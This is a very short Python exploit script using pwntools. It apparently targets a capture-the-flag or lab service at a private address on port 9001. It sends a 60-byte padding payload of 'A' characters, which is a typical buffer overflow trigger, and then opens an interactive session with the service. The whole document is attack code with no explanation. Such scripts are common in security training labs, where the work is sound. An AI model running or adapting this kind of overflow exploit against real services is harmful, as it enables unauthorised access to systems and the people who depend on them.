from pwn import *
 

payload = b"A"*60
connect = remote('10.10.131.129', '9001')
connect.sendline(payload)

connect.interactive()
connect.recv()
connect.close()
